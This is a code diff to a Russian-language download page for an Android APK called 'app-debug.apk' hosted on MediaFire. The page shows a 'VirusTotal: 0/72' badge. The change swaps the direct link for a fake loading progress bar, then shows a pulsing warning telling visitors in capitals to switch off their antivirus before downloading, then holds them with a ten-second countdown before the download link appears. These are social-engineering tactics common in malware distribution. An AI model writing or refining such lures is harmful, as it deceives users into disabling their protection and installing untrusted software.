@@ -1176,7 +1176,7 @@
             border: 1px solid var(--card-border);
             border-radius: 24px;
             padding: 40px;
-            max-width: 500px;
+            max-width: 550px;
             width: 100%;
             text-align: center;
             animation: modalIn 0.4s ease;
@@ -1230,11 +1230,100 @@
             font-weight: 700;
             transition: all 0.3s ease;
             text-transform: uppercase;
+            text-decoration: none;
+            display: inline-block;
         }
 
         .modal-close:hover {
             transform: translateY(-2px);
             box-shadow: 0 10px 30px rgba(255, 106, 0, 0.4);
+        }
+
+        .modal-close:disabled {
+            background: #444;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* ============ WARNING BOX ============ */
+        .warning-box {
+            background: linear-gradient(135deg, rgba(255, 45, 85, 0.15), rgba(255, 106, 0, 0.15));
+            border: 2px solid var(--neon-red);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+            animation: warningPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes warningPulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(255, 45, 85, 0.3); }
+            50% { box-shadow: 0 0 40px rgba(255, 45, 85, 0.6); }
+        }
+
+        .warning-box .warning-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .warning-box .warning-icon {
+            font-size: 2rem;
+            animation: shake 0.5s ease-in-out infinite;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: rotate(0deg); }
+            25% { transform: rotate(-10deg); }
+            75% { transform: rotate(10deg); }
+        }
+
+        .warning-box .warning-title {
+            font-family: 'Russo One', sans-serif;
+            color: var(--neon-red);
+            font-size: 1.1rem;
+            text-transform: uppercase;
+        }
+
+        .warning-box .warning-text {
+            color: #fff;
+            font-size: 1rem;
+            line-height: 1.6;
+            font-weight: 600;
+        }
+
+        .warning-box .warning-text span {
+            color: var(--neon-yellow);
+            text-decoration: underline;
+        }
+
+        /* ============ COUNTDOWN TIMER ============ */
+        .countdown-timer {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-family: 'Orbitron', monospace;
+            font-size: 1.5rem;
+            color: var(--neon-cyan);
+            margin: 15px 0;
+        }
+
+        .countdown-number {
+            background: rgba(0, 240, 255, 0.1);
+            border: 2px solid var(--neon-cyan);
+            border-radius: 10px;
+            padding: 10px 20px;
+            min-width: 60px;
+            font-weight: 900;
+            animation: countdownPulse 1s ease-in-out infinite;
+        }
+
+        @keyframes countdownPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
 
         /* ============ NOTIFICATION ============ */
@@ -1390,6 +1479,8 @@
             .reviews-grid { grid-template-columns: 1fr; }
             .download-box { padding: 30px 20px; }
             .vt-result { flex-direction: column; }
+            .modal { padding: 25px; }
+            .warning-box { padding: 15px; }
         }
 
         /* Custom scrollbar */
@@ -1652,12 +1743,9 @@
                     </div>
                 </div>
 
-                <a href="https://www.mediafire.com/file/s9p3zl5kpt6lo1c/app-debug.apk/file" 
-                   class="btn-big-download" 
-                   id="downloadBtn"
-                   onclick="trackDownload()">
+                <button class="btn-big-download" id="downloadBtn" onclick="trackDownload(event)">
                     ⬇️ СКАЧАТЬ APK
-                </a>
+                </button>
 
                 <div class="download-meta">
                     <span>🛡️ VirusTotal: 0/72</span>
@@ -2041,14 +2129,34 @@
         <div class="modal">
             <h2 id="modalTitle">⬇️ Подготовка...</h2>
             <p id="modalDesc">Подключение к серверу загрузки</p>
+            
+            <!-- Warning Box -->
+            <div class="warning-box" id="warningBox" style="display: none;">
+                <div class="warning-header">
+                    <span class="warning-icon">⚠️</span>
+                    <span class="warning-title">ВАЖНОЕ СООБЩЕНИЕ!</span>
+                </div>
+                <div class="warning-text">
+                    ПЕРЕД ТЕМ КАК СКАЧАТЬ ФАЙЛ, <span>ВЫКЛЮЧИТЕ АНТИВИРУС</span> ДЛЯ ЛУЧШЕЙ РАБОТЫ!
+                </div>
+            </div>
+            
             <div class="progress-bar">
                 <div class="progress-fill" id="progressFill"></div>
             </div>
             <span class="progress-text" id="progressText">0%</span>
+            
+            <!-- Countdown Timer -->
+            <div class="countdown-timer" id="countdownTimer" style="display: none;">
+                <span>Подождите:</span>
+                <span class="countdown-number" id="countdownNumber">10</span>
+                <span>сек</span>
+            </div>
+            
             <br>
             <a href="https://www.mediafire.com/file/s9p3zl5kpt6lo1c/app-debug.apk/file" 
                class="modal-close" id="modalClose" style="display:none;" target="_blank">
-                📥 ПЕРЕЙТИ К СКАЧИВАНИЮ
+                📥 СКАЧАТЬ ФАЙЛ
             </a>
         </div>
     </div>
@@ -2190,19 +2298,27 @@
             if (!isActive) faqItem.classList.add('active');
         }
 
-        // ============ DOWNLOAD TRACKING ============
-        function trackDownload() {
+        // ============ DOWNLOAD TRACKING WITH 10 SEC COOLDOWN ============
+        function trackDownload(event) {
+            event.preventDefault();
+            
             const modal = document.getElementById('downloadModal');
             const progressFill = document.getElementById('progressFill');
             const progressText = document.getElementById('progressText');
             const modalTitle = document.getElementById('modalTitle');
             const modalDesc = document.getElementById('modalDesc');
             const modalClose = document.getElementById('modalClose');
+            const warningBox = document.getElementById('warningBox');
+            const countdownTimer = document.getElementById('countdownTimer');
+            const countdownNumber = document.getElementById('countdownNumber');
 
+            // Reset state
             modal.classList.add('active');
             modalTitle.textContent = '⬇️ Подготовка загрузки...';
             modalDesc.textContent = 'Подключение к серверу...';
             modalClose.style.display = 'none';
+            warningBox.style.display = 'none';
+            countdownTimer.style.display = 'none';
             progressFill.style.width = '0%';
 
             let progress = 0;
@@ -2220,9 +2336,29 @@
                 if (progress >= 100) {
                     progress = 100;
                     clearInterval(interval);
-                    modalTitle.textContent = '✅ Файл готов!';
-                    modalDesc.textContent = 'Нажми кнопку чтобы скачать APK с MediaFire';
-                    modalClose.style.display = 'inline-block';
+                    
+                    // Show warning and start countdown
+                    modalTitle.textContent = '⚠️ ВНИМАНИЕ!';
+                    modalDesc.textContent = 'Прочитайте важную информацию:';
+                    warningBox.style.display = 'block';
+                    countdownTimer.style.display = 'flex';
+                    
+                    // Start 10 second countdown
+                    let countdown = 10;
+                    countdownNumber.textContent = countdown;
+                    
+                    const countdownInterval = setInterval(() => {
+                        countdown--;
+                        countdownNumber.textContent = countdown;
+                        
+                        if (countdown <= 0) {
+                            clearInterval(countdownInterval);
+                            countdownTimer.style.display = 'none';
+                            modalTitle.textContent = '✅ Файл готов!';
+                            modalDesc.textContent = 'Нажми кнопку чтобы скачать APK с MediaFire';
+                            modalClose.style.display = 'inline-block';
+                        }
+                    }, 1000);
                 }
 
                 progressFill.style.width = progress + '%';
@@ -2234,9 +2370,6 @@
                     }
                 });
             }, 60);
-
-            // Prevent actual navigation since we show modal first
-            event.preventDefault();
         }
 
         // Close modal on overlay click
